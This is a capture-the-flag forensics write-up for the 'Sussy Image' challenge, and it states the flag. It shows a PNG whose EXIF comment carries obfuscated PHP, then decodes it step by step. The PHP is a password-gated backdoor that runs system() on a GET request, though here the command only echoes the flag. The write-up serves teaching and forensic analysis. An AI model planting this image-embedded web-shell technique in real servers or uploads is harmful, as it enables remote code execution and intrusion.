# Challenge

**Name:** Sussy Image

**Category:** forensics

**Author:** Alex Brown (ghostccamm)

**Flag:** `CTF{sV5sI_iM4g3_g0t_y3_h4cK3d!}`

## **Description:**

We recently got hacked but we are not sure how the hackers did it! We did notice that someone uploaded this sussy **`sus.png`** to our server just before we got compromised.

Can you analyse this **`sus.png`** to see if it was used to hack our systems?

## **Solution:**

### Method 1: The reponsible way

Checking the metadata of `sus.png`, we can see that some php some php code has been inserted into the Comment for the image.

```
$ exiftool sus.png 
ExifTool Version Number         : 11.88
File Name                       : sus.png
Directory                       : .
File Size                       : 59 kB
File Modification Date/Time     : 2022:04:26 10:52:13+08:00
File Access Date/Time           : 2022:04:26 10:52:20+08:00
File Inode Change Date/Time     : 2022:04:26 10:52:20+08:00
File Permissions                : rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 480
Image Height                    : 654
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Comment                         : <?php $sus = "aWYoaXNzZXQoJF9HRVRbJ3NlY3JldCddKSl7JGMxID0gJ0FBd0RFUmNKJzskYzIgPSAnRmhZWUNsSkQnOyRjMyA9ICdOaVFqQ1FjNSc7JGM0ID0gJ1JRQXNQQnNvJzskYzUgPSAnUUJkU0xCUkgnOyRjNiA9ICdHeTBkVlRBYSc7JGM3ID0gJ1JoWWxYUTFQJzskYzggPSAnR2xjPSc7aWYoJF9HRVRbJ3NlY3JldCddPT09J3N1cGVyZHVwZXJ0b3BzZWNyZXRwYXNzd29yZGZvcnJ1bm5pbmdwaHBhbmRoYWNraW5nc2VydmVyc2xvbC4uLmRlZnNub3RzdXMnKXskc3VzID0gYmFzZTY0X2RlY29kZSgkYzEpIF4gJF9HRVRbJ3NlY3JldCddOyRldmVuX3N1c3NpZXIgPSBiYXNlNjRfZGVjb2RlKCRjMi4kYzMuJGM0LiRjNS4kYzYuJGM3LiRjOCleICRfR0VUWydzZWNyZXQnXTskc3VzKCRldmVuX3N1c3NpZXIpO319IF9faGFsdF9jb21waWxlcigpOw==";$sussy=base64_decode($sus);eval($sussy);
Image Size                      : 480x654
Megapixels                      : 0.314
```

The actual PHP code is obsfucated using **base64**, so next we would need to decode the `$sus`.

```
$ echo  aWYoaXNzZXQoJF9HRVRbJ3NlY3JldCddKSl7JGMxID0gJ0FBd0RFUmNKJzskYzIgPSAnRmhZWUNsSkQnOyRjMyA9ICdOaVFqQ1FjNSc7JGM0ID0gJ1JRQXNQQnNvJzskYzUgPSAnUUJkU0xCUkgnOyRjNiA9ICdHeTBkVlRBYSc7JGM3ID0gJ1JoWWxYUTFQJzskYzggPSAnR2xjPSc7aWYoJF9HRVRbJ3NlY3JldCddPT09J3N1cGVyZHVwZXJ0b3BzZWNyZXRwYXNzd29yZGZvcnJ1bm5pbmdwaHBhbmRoYWNraW5nc2VydmVyc2xvbC4uLmRlZnNub3RzdXMnKXskc3VzID0gYmFzZTY0X2RlY29kZSgkYzEpIF4gJF9HRVRbJ3NlY3JldCddOyRldmVuX3N1c3NpZXIgPSBiYXNlNjRfZGVjb2RlKCRjMi4kYzMuJGM0LiRjNS4kYzYuJGM3LiRjOCleICRfR0VUWydzZWNyZXQnXTskc3VzKCRldmVuX3N1c3NpZXIpO319IF9faGFsdF9jb21waWxlcigpOw== | base64 -d

if(isset($_GET['secret'])){$c1 = 'AAwDERcJ';$c2 = 'FhYYClJD';$c3 = 'NiQjCQc5';$c4 = 'RQAsPBso';$c5 = 'QBdSLBRH';$c6 = 'Gy0dVTAa';$c7 = 'RhYlXQ1P';$c8 = 'Glc=';if($_GET['secret']==='superdupertopsecretpasswordforrunningphpandhackingserverslol...defsnotsus'){$sus = base64_decode($c1) ^ $_GET['secret'];$even_sussier = base64_decode($c2.$c3.$c4.$c5.$c6.$c7.$c8)^ $_GET['secret'];$sus($even_sussier);}} __halt_compiler();
```

Neating up the code a bit we get the following PHP code

```php
if(isset($_GET['secret'])) {
    $c1 = 'AAwDERcJ';
    $c2 = 'FhYYClJD';
    $c3 = 'NiQjCQc5';
    $c4 = 'RQAsPBso';
    $c5 = 'QBdSLBRH';
    $c6 = 'Gy0dVTAa';
    $c7 = 'RhYlXQ1P';
    $c8 = 'Glc=';
    if($_GET['secret']==='superdupertopsecretpasswordforrunningphpandhackingserverslol...defsnotsus') {
        $sus = base64_decode($c1) ^ $_GET['secret'];
        $even_sussier = base64_decode($c2.$c3.$c4.$c5.$c6.$c7.$c8)^ $_GET['secret'];
        $sus($even_sussier);
    }
}
__halt_compiler();
```

Interestingly we can see that program checks for the secret value `superdupertopsecretpasswordforrunningphpandhackingserverslol...defsnotsus`, then performs the XOR operation on base64 decoded values of `c1` and the concatenation of `c2`, `c3`, `c4`, `c5`, `c6`, `c7` and `c8`.

Using CyberChef, we can decode the values to reveal the flag.

[*`$sus = 'system'`*](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'UTF8','string':'superdupertopsecretpasswordforrunningphpandhackingserverslol...defsnotsus'%7D,'Standard',false)&input=QUF3REVSY0o)

[*`$even_sussier = "echo 'CTF{sV5sI_iM4g3_g0t_y3_h4cK3d!}'"`*](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'UTF8','string':'superdupertopsecretpasswordforrunningphpandhackingserverslol...defsnotsus'%7D,'Standard',false)&input=RmhZWUNsSkROaVFqQ1FjNVJRQXNQQnNvUUJkU0xCUkhHeTBkVlRBYVJoWWxYUTFQR2xjPQ)

### Method 2: The Monke Method

Instead of decoding `$sus` and `$even_sussier`, you modify the above PHP code so it echos the decoded values to get the flag.

[*`monke.php`*](solution/monke.php)
```php
<?php
$secret = 'superdupertopsecretpasswordforrunningphpandhackingserverslol...defsnotsus';

$c1 = 'AAwDERcJ';
$c2 = 'FhYYClJD';
$c3 = 'NiQjCQc5';
$c4 = 'RQAsPBso';
$c5 = 'QBdSLBRH';
$c6 = 'Gy0dVTAa';
$c7 = 'RhYlXQ1P';
$c8 = 'Glc=';

$sus = base64_decode($c1) ^ $secret;
$even_sussier = base64_decode($c2.$c3.$c4.$c5.$c6.$c7.$c8) ^ $secret;
echo '$sus: '.$sus."\n";
echo '$even_sussier: '.$even_sussier."\n";
__halt_compiler();
```

Executing

```
$ php -f monke.php

$sus: system
$even_sussier: echo 'CTF{sV5sI_iM4g3_g0t_y3_h4cK3d!}'
```